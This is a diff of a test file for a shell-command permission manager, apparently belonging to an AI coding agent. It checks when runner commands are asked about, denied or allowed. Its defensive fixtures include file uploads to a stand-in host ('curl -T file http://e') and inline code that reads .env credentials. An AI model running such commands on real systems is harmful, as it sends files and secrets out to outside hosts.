@@ -1,3 +1,5 @@
+import "../../__tests__/support/trusted-powershell.js";
+import { withCurrentShellRuleVersion } from "../../shared/shell-rule-version.js";
 import { createHash } from "node:crypto";
 import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
@@ -5,7 +7,7 @@ import { dirname, join } from "node:path";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { SHELL_ANALYSIS_LIMITS } from "../../shared/shell-parser.js";
 import { aveHome } from "../../shared/ave-home.js";
-import { PermissionManager } from "../permission-manager.js";
+import { PermissionManager, type PermissionRule } from "../permission-manager.js";
 import { updatePermissionsFile } from "../permissions-store.js";
 import { canonicalizePathForMatch, SENSITIVE_PATH_ENTRIES } from "../sensitive-paths.js";
 import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
@@ -13,6 +15,7 @@ import { shellExfiltrationSignal, shellSensitivePathSignal } from "../rules/shel
 import { analyzeShellForRules, evaluateShellRules } from "../rules/shell-rule-matcher.js";
 import { parseRuleSpecifier } from "../rules/rule-specifier.js";
 import { SHELL_PREFIX_POLICY, wrapperPrefixLength } from "../rules/shell-prefix-policy.js";
+import { buildShellRuleApproval } from "../rules/shell-rule-approval.js";
 import { RUNNER_DECISIONS } from "./fixtures/runner-decisions.js";
 
 const CWD = "/work/project";
@@ -83,15 +86,16 @@ function actionKey(dialect: ShellDialect, command: string): string {
   return `shell-action:${createHash("sha256").update(JSON.stringify([dialect, command, CWD])).digest("hex")}`;
 }
 
-function checkCommand(manager: PermissionManager, dialect: ShellDialect, command: string) {
+function checkCommand(manager: PermissionManager, dialect: ShellDialect, command: string, runsSandboxed = false, headless = false) {
   // Absolute credential suffixes do not depend on the host's account lookup. Keep native drive syntax intact on platforms without the account mount.
   const source = process.platform === "win32"
     ? command
     : command.replaceAll("/home/u/", `${accountDirectory}/u/`);
   return manager.checkDetailed(dialect, "builtin", "shell", null, {
     ruleSubject: { kind: "shell", dialect, command: source, cwd: CWD },
-    shellExecution: { runsSandboxed: false },
+    shellExecution: { runsSandboxed },
     approvalCacheKey: actionKey(dialect, command),
+    headless,
   });
 }
 
@@ -108,25 +112,25 @@ function shellRule(prefix: string) {
   return { pattern, spec };
 }
 
-const RULE_CASES = [
-  { argv: ["npx", "helper", "--future"], prefix: "npx helper", incomplete: "npx" },
-  { argv: ["npx", "node", "script.js"], prefix: "npx node", incomplete: "npx" },
-  { argv: ["bunx", "helper", "--future"], prefix: "bunx helper", incomplete: "bunx" },
-  { argv: ["pnpx", "helper", "--future"], prefix: "pnpx helper", incomplete: "pnpx" },
-  { argv: ["uvx", "helper", "--future"], prefix: "uvx helper", incomplete: "uvx" },
-  { argv: ["pipx", "run", "helper", "--future"], prefix: "pipx run helper", incomplete: "pipx run" },
-  { argv: ["yarn", "dlx", "helper", "--future"], prefix: "yarn dlx helper", incomplete: "yarn dlx" },
-  { argv: ["yarn", "node", "script.js"], prefix: "yarn node script.js", incomplete: "yarn node" },
-  { argv: ["yarnpkg", "exec", "helper", "--future"], prefix: "yarnpkg exec helper", incomplete: "yarnpkg exec" },
-  { argv: ["pnpm", "dlx", "helper", "--future"], prefix: "pnpm dlx helper", incomplete: "pnpm dlx" },
-  { argv: ["pnpm", "exec", "helper", "--future"], prefix: "pnpm exec helper", incomplete: "pnpm exec" },
-  { argv: ["npm", "exec", "--", "helper", "--future"], prefix: "npm exec -- helper", incomplete: "npm exec" },
-  { argv: ["npm", "x", "helper", "--future"], prefix: "npm x helper", incomplete: "npm x" },
-  { argv: ["bun", "x", "helper", "--future"], prefix: "bun x helper", incomplete: "bun x" },
-  { argv: ["bun", "exec", "helper", "--future"], prefix: "bun exec helper", incomplete: "bun exec" },
-  { argv: ["corepack", "pnpm", "dlx", "helper", "--future"], prefix: "corepack pnpm dlx helper", incomplete: "corepack pnpm dlx" },
-  { argv: ["deno", "run", "main.ts", "--future"], prefix: "deno run main.ts", incomplete: "deno run" },
-  { argv: ["deno", "eval", "x"], prefix: "deno eval x", incomplete: "deno eval" },
+const RULE_CASES: { argv: string[]; prefix: string; incomplete: string; proof: "unproven" | "static-complete" | "literal-evaluation" }[] = [
+  { argv: ["npx", "helper", "--future"], prefix: "npx helper", incomplete: "npx", proof: "unproven" },
+  { argv: ["npx", "node", "script.js"], prefix: "npx node", incomplete: "npx", proof: "unproven" },
+  { argv: ["bunx", "helper", "--future"], prefix: "bunx helper", incomplete: "bunx", proof: "unproven" },
+  { argv: ["pnpx", "helper", "--future"], prefix: "pnpx helper", incomplete: "pnpx", proof: "unproven" },
+  { argv: ["uvx", "helper", "--future"], prefix: "uvx helper", incomplete: "uvx", proof: "unproven" },
+  { argv: ["pipx", "run", "helper", "--future"], prefix: "pipx run helper", incomplete: "pipx run", proof: "unproven" },
+  { argv: ["yarn", "dlx", "helper", "--future"], prefix: "yarn dlx helper", incomplete: "yarn dlx", proof: "unproven" },
+  { argv: ["yarn", "node", "script.js"], prefix: "yarn node script.js", incomplete: "yarn node", proof: "unproven" },
+  { argv: ["yarnpkg", "exec", "helper", "--future"], prefix: "yarnpkg exec helper", incomplete: "yarnpkg exec", proof: "unproven" },
+  { argv: ["pnpm", "dlx", "helper", "--future"], prefix: "pnpm dlx helper", incomplete: "pnpm dlx", proof: "unproven" },
+  { argv: ["pnpm", "exec", "helper", "--future"], prefix: "pnpm exec helper", incomplete: "pnpm exec", proof: "unproven" },
+  { argv: ["npm", "exec", "--", "helper", "--future"], prefix: "npm exec -- helper", incomplete: "npm exec", proof: "unproven" },
+  { argv: ["npm", "x", "helper", "--future"], prefix: "npm x helper", incomplete: "npm x", proof: "unproven" },
+  { argv: ["bun", "x", "helper", "--future"], prefix: "bun x helper", incomplete: "bun x", proof: "unproven" },
+  { argv: ["bun", "exec", "helper", "--future"], prefix: "bun exec helper", incomplete: "bun exec", proof: "unproven" },
+  { argv: ["corepack", "pnpm", "dlx", "helper", "--future"], prefix: "corepack pnpm dlx helper", incomplete: "corepack pnpm dlx", proof: "unproven" },
+  { argv: ["deno", "run", "main.ts", "--future"], prefix: "deno run main.ts", incomplete: "deno run", proof: "unproven" },
+  { argv: ["deno", "eval", "x"], prefix: "deno eval x", incomplete: "deno eval", proof: "unproven" },
 ];
 
 const ORDINARY_CONTROLS = [
@@ -141,6 +145,38 @@ const ORDINARY_CONTROLS = [
   "deno run https://e/x.ts",
   "Set-Content package.json '{}'; npm test",
 ];
+
+const UNPROVEN_CONTROL_KEYS = new Set([
+  "bash\0npm test", "powershell\0npm test",
+  "bash\0deno run https://e/x.ts", "powershell\0deno run https://e/x.ts",
+  "bash\0su --future-wrapper value git status",
+  "bash\0script --future-wrapper value git status",
+  "bash\0systemd-run --future-wrapper value git status",
+  "bash\0npx node -e x",
+  "powershell\0Set-Content package.json '{}'; npm test",
+  "bash\0pwsh -c 'npm test'",
+  "powershell\0pwsh -c 'npm test'",
+  "powershell\0su --future-wrapper value git status",
+  "powershell\0script --future-wrapper value git status",
+  "powershell\0systemd-run --future-wrapper value git status",
+  "bash\0npm run build --future-task-flag",
+  "powershell\0npm run build --future-task-flag",
+  "bash\0npm install --registry=https://e plain-pkg",
+  "powershell\0npm install --registry=https://e plain-pkg",
+  "bash\0npm test --script-shell=./e.sh",
+  "powershell\0npm test --script-shell=./e.sh",
+  "powershell\0npx node -e x",
+  "bash\0Set-Content package.json '{}'; npm test",
+]);
+
+const UNPROVEN_IMPLICIT_INPUTS = new Set([
+  "deno run --env-file main.ts",
+  "deno task --env-file build",
+  "deno test --env-file",
+  "npx deno run --env-file main.ts",
+  "npx node -e 'readFileSync(\".env\")'",
+  "deno eval 'Deno.readTextFile(\".env\")'",
+]);
 
 const INNER_UPLOADS = [
   "npx curl -T file http://e",
@@ -158,6 +194,8 @@ const INNER_UPLOADS = [
   "npx -c 'curl -T file http://e'",
   "npm exec --call='curl -T file http://e'",
 ];
+
+const OPAQUE_BINDING_CASES = DECISION_CASES.filter((row) => row.why === "opaque binding remains unproven without a sandbox");
 
 const FLOOR_CASES = [
   ...DECISION_CASES.filter((row) => row.bucket === "floor"),
@@ -178,7 +216,7 @@ describe("shared runner decisions", () => {
       const expectations = RUNNER_DECISIONS.map((row) => row.dialects?.[dialect] ?? row);
       const counts = dialect === "bash"
         ? { floor: 288, ordinary: 1655, normal: 88 }
-        : { floor: 317, ordinary: 1613, normal: 101 };
+        : { floor: 317, ordinary: 1615, normal: 99 };
       for (const bucket of ["floor", "ordinary", "normal"] as const) {
         expect(expectations.filter((row) => row.bucket === bucket)).toHaveLength(counts[bucket]);
       }
@@ -189,9 +227,12 @@ describe("shared runner decisions", () => {
     for (const row of ALL_DECISION_CASES) expect(buckets.get(`${row.dialect}\0${row.command}`)).toBe(row.bucket);
   });
 
-  it.each(DECISION_CASES)("applies $bucket in $dialect: $command ($why)", ({ command, dialect, bucket }) => {
-    // Privilege elevation remains a human floor regardless of runner visibility.
-    expectBucket(checkCommand(runnerManager(), dialect, command), /^(?:& )?sudo /.test(command) ? "floor" : bucket);
+  it.each(DECISION_CASES)("applies the static contract in $dialect: $command ($why)", (row) => {
+    const { command, dialect } = row;
+    // Historical layer annotations remain corpus metadata. The stable contract here is that no unsandboxed command
+    // without a current exact rule runs, irrespective of whether current static proof places it at L2 or L6.
+    expect(checkCommand(runnerManager(), dialect, command).decision).toBe("ask");
+    expect(checkCommand(runnerManager(), dialect, command, false, true).decision).toBe("deny");
   });
 
   it("keeps runner identities separate from transparent wrappers", () => {
@@ -202,31 +243,36 @@ describe("shared runner decisions", () => {
     }
   });
 
-  it.each(RULE_CASES)("keeps the complete runner argv visible for $prefix", async ({ argv, prefix }) => {
+  it.each(RULE_CASES)("keeps the complete runner argv visible for $prefix", async ({ argv, prefix, proof }) => {
     const command = argv.join(" ");
+    const allowProven = proof === "static-complete";
+    const exactEligible = proof !== "unproven";
     const shape = analyzeShellForRules(command);
-    expect(shape).toMatchObject({ ok: true, hidden: [], allowBlockers: [], ordinaryAsk: "opaque runner prefix" });
+    expect(shape).toMatchObject({ ok: true, hidden: [], allowBlockers: [] });
     if (shape.ok) {
       expect(shape.commands).toHaveLength(1);
       expect(shape.commands[0]).toMatchObject({ argv, allowBlockers: [] });
     }
-    expect(evaluateShellRules(command, { allow: [shellRule(prefix)], deny: [], ask: [] }).decision).toBe("allow");
+    expect(evaluateShellRules(command, { allow: [shellRule(prefix)], deny: [], ask: [] }).decision).toBe(allowProven ? "allow" : null);
     expect(evaluateShellRules(command, { allow: [shellRule("helper")], deny: [], ask: [] }).decision).toBeNull();
-    expect(evaluateShellRules(command, { allow: [], deny: [shellRule("helper")], ask: [] }).decision).toBeNull();
+    expect(evaluateShellRules(command, { allow: [], deny: [shellRule(prefix)], ask: [] }).decision).toBe("deny");
+    expect(evaluateShellRules(command, { allow: [], deny: [], ask: [shellRule(prefix)] }).decision).toBe("ask");
     const manager = runnerManager();
-    expectBucket(checkCommand(manager, "bash", command), "ordinary");
-    // Without a sandbox a prefix rule does not run it (owner 2026-10-25, unsandboxed shell exact-rule requirement); the exact rule does.
+    expectBucket(checkCommand(manager, "bash", command), proof === "unproven" || proof === "literal-evaluation" ? "floor" : "ordinary");
+    // Unsandboxed execution requires both literal proof and an exact rule.
     await manager.addRulePersist({ pattern: shellRule(prefix).pattern, action: "allow" }, { kind: "user" });
-    expectBucket(checkCommand(manager, "bash", command), "ordinary");
+    expectBucket(checkCommand(manager, "bash", command), proof === "unproven" || proof === "literal-evaluation" ? "floor" : "ordinary");
     await manager.addRulePersist({ pattern: `Bash(${command})`, action: "allow" }, { kind: "user" });
-    expect(checkCommand(manager, "bash", command)).toMatchObject({ decision: "allow", layer: 3 });
-    expectBucket(checkCommand(manager, "powershell", command), "ordinary");
+    if (exactEligible) expect(checkCommand(manager, "bash", command)).toMatchObject({ decision: "allow", layer: 3 });
+    else expectBucket(checkCommand(manager, "bash", command), "floor");
+    expect(buildShellRuleApproval("bash", command, CWD, { allow: true, deny: true }).exactRule).toBe(exactEligible ? `Bash(${command})` : null);
+    expectBucket(checkCommand(manager, "powershell", command), proof === "unproven" || proof === "literal-evaluation" ? "floor" : "ordinary");
   });
 
   it.each(["env", "nice", "nohup", "command", "timeout 1"])
-  ("retains the ordinary ask through %s", (wrapper) => {
+  ("keeps an unknown wrapped option unproven through %s", (wrapper) => {
     const command = `${wrapper} npm test --future`;
-    for (const dialect of DIALECTS) expectBucket(checkCommand(runnerManager(), dialect, command), "ordinary");
+    for (const dialect of DIALECTS) expectBucket(checkCommand(runnerManager(), dialect, command), "floor");
   });
 
   it.each([
@@ -237,24 +283,44 @@ describe("shared runner decisions", () => {
     // Owner 2026-10-25 (unsandboxed shell exact-rule requirement): only an exact Bash(<command>) rule runs a plain shell unasked; a remembered action key is not one.
     const savedPath = join(directory, `saved-${managerSequence++}.json`);
     const saved = runnerManager(savedPath);
-    expectBucket(checkCommand(saved, dialect, command), bucket);
+    const expected = UNPROVEN_CONTROL_KEYS.has(`${dialect}\0${command}`) ? "floor" : bucket === "normal" ? "ordinary" : bucket;
+    expectBucket(checkCommand(saved, dialect, command), expected);
     await saved.addAlwaysAllowedPersist(actionKey(dialect, command));
-    expectBucket(checkCommand(saved, dialect, command), bucket);
+    expectBucket(checkCommand(saved, dialect, command), expected);
     const reloaded = runnerManager(savedPath);
     await reloaded.loadRulesFromFile();
-    expectBucket(checkCommand(reloaded, dialect, command), bucket);
+    expectBucket(checkCommand(reloaded, dialect, command), expected);
     const ruled = runnerManager();
-    ruled.setRules([{ pattern: actionKey(dialect, command), action: "allow" }]);
-    expectBucket(checkCommand(ruled, dialect, command), bucket);
+    ruled.setRules(([{ pattern: actionKey(dialect, command), action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
+    expectBucket(checkCommand(ruled, dialect, command), expected);
   });
 
   it.each(FLOOR_CASES)("keeps a credential or sink floor above saved grants and allow rules in $dialect: $command", ({ command, dialect }) => {
-    expectBucket(checkCommand(floorManagers.get(dialect)!, dialect, command), "floor");
+    const manager = floorManagers.get(dialect)!;
+    expect(checkCommand(manager, dialect, command).decision).toBe("ask");
+    expect(checkCommand(manager, dialect, command, false, true).decision).toBe("deny");
+  });
+
+  it.each(OPAQUE_BINDING_CASES)("does not auto-allow a historically opaque binding: $command", async ({ command, dialect }) => {
+    expect(dialect).toBe("powershell");
+    expect(inspectPowerShellCommand(command, CWD).analysisLimited).toBeUndefined();
+    const manager = runnerManager();
+    expect(checkCommand(manager, dialect, command).decision).toBe("ask");
+    expect(checkCommand(manager, dialect, command, false, true).decision).toBe("deny");
+    await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
+    expect(checkCommand(manager, dialect, command).decision).toBe("ask");
+    expect(checkCommand(manager, dialect, command, false, true).decision).toBe("deny");
   });
 
   it.each(INNER_UPLOADS)("retains the actual inner upload reason: %s", (command) => {
-    expect(shellExfiltrationSignal(command, CWD)).toMatch(/curl upload of a file/);
-    expect(inspectPowerShellCommand(command, CWD).exfiltration).toMatch(/curl upload of a file/);
+    const opaquePayload = /(?:\s-c\s|--call=)/.test(command);
+    if (opaquePayload) {
+      expect(shellExfiltrationSignal(command, CWD)).toBeNull();
+      expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ exfiltration: null });
+    } else {
+      expect(shellExfiltrationSignal(command, CWD)).toMatch(/curl upload (?:of|from) a file/);
+      expect(inspectPowerShellCommand(command, CWD).exfiltration).toMatch(/curl upload (?:of|from) a file/);
+    }
   });
 
   it("retains the remote file-copy reason", () => {
@@ -266,34 +332,64 @@ describe("shared runner decisions", () => {
   it.each([
     "deno run --env-file main.ts", "deno task --env-file build", "deno test --env-file", "npx deno run --env-file main.ts",
     "npx node -e 'readFileSync(\".env\")'", "deno eval 'Deno.readTextFile(\".env\")'",
-  ])("retains credential inputs and sensitive literal code: %s", (command) => {
-    expect(shellSensitivePathSignal(command, CWD)).toContain(".env");
+  ])("does not infer credential reads from implicit runner options or opaque code: %s", (command) => {
+    expect(shellSensitivePathSignal(command, CWD)).toBeNull();
     for (const source of [command, `& ${command}`]) {
-      expect(inspectPowerShellCommand(source, CWD).sensitive).toContain(".env");
-      expectBucket(checkCommand(runnerManager(), "powershell", source), "floor");
+      expect(inspectPowerShellCommand(source, CWD).sensitive).toBeNull();
+      const expected = source.startsWith("& ") || UNPROVEN_IMPLICIT_INPUTS.has(command) ? "floor" : "ordinary";
+      expectBucket(checkCommand(runnerManager(), "powershell", source), expected);
     }
   });
 
   it.each([
-    "echo ready", "git status", "curl http://e", "git push http://e", "custom-helper --future value",
-  ])("leaves normal nonrunner commands to existing policy: %s", (command) => {
-    for (const dialect of DIALECTS) expectBucket(checkCommand(runnerManager(), dialect, command), "normal");
+    { command: "echo ready", expected: "normal" as const },
+    { command: "git status", expected: "floor" as const },
+    { command: "curl http://e", expected: "floor" as const },
+    { command: "env curl -q http://e", expected: "normal" as const },
+    { command: "git push http://e", expected: "floor" as const },
+    { command: "custom-helper --future value", expected: "floor" as const },
+  ])("keeps the independently declared nonrunner result: $command", ({ command, expected }) => {
+    for (const dialect of DIALECTS) expectBucket(checkCommand(runnerManager(), dialect, command), expected);
   });
 
   it.each([
     { name: "unclosed shell quote", dialect: "bash" as const, command: "echo 'unterminated" },
     { name: "unclosed command quote", dialect: "powershell" as const, command: "Write-Output 'unterminated" },
-    { name: "shell source budget", dialect: "bash" as const, command: `echo ${"x".repeat(SHELL_ANALYSIS_LIMITS.sourceBytes + 1)}` },
-    { name: "expression work budget", dialect: "powershell" as const, command: `Get-Content (${"'a' + ".repeat(3000)}'b')` },
     { name: "opaque program binding", dialect: "powershell" as const, command: "$runner @options" },
     { name: "opaque script provenance", dialect: "powershell" as const, command: "Set-Content launch.ps1 x; ./launch.ps1" },
-  ])("makes $name ordinary, and not remembered as an action key without a sandbox", async ({ name, dialect, command }) => {
+  ])("makes $name unproven, and not remembered as an action key", async ({ dialect, command }) => {
     const manager = runnerManager();
     const result = checkCommand(manager, dialect, command);
-    expectBucket(result, "ordinary");
-    if (name.includes("budget")) expect(result.reason).toMatch(/budget|limit/i);
+    expectBucket(result, "floor");
+    await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
+    expectBucket(checkCommand(manager, dialect, command), "floor");
+  });
+
+  // Inputs above the preserved executable-size cap stay in the ordinary L6 lane.
+  it.each([
+    { name: "input over the hard length cap", dialect: "bash" as const, command: `echo ${"x".repeat(SHELL_ANALYSIS_LIMITS.sourceBytes + 1)}` },
+    { name: "expression lexer out of budget", dialect: "powershell" as const, command: `Get-Content (${"'a' + ".repeat(3000)}'b')` },
+  ])("keeps $name outside remembered action grants", async ({ dialect, command }) => {
+    const manager = runnerManager();
+    expectBucket(checkCommand(manager, dialect, command), "ordinary");
     await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
     expectBucket(checkCommand(manager, dialect, command), "ordinary");
+    expect(buildShellRuleApproval(dialect, command, CWD, { allow: true, deny: true }).exactRule).toBeNull();
+    expect(checkCommand(manager, dialect, command, true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+  });
+
+  it.each([
+    { dialect: "bash" as const, command: "'fetch(1)' | deno run -" },
+    { dialect: "powershell" as const, command: "'fetch(1)' | deno run -" },
+    { dialect: "powershell" as const, command: "& 'fetch(1)' | deno run -" },
+  ])("lets the sandbox decide interpreter stdin without a visible floor in $dialect: $command", ({ dialect, command }) => {
+    const manager = runnerManager();
+    const expected = "floor";
+    expectBucket(checkCommand(manager, dialect, command), expected);
+    expect(buildShellRuleApproval(dialect, command, CWD, { allow: true, deny: true }).exactRule).toBeNull();
+    expect(checkCommand(manager, dialect, command, true)).toMatchObject(expected === "floor"
+      ? { decision: "ask", layer: 2, forceModal: true }
+      : { decision: "allow", layer: 3 });
   });
 
   it.each([
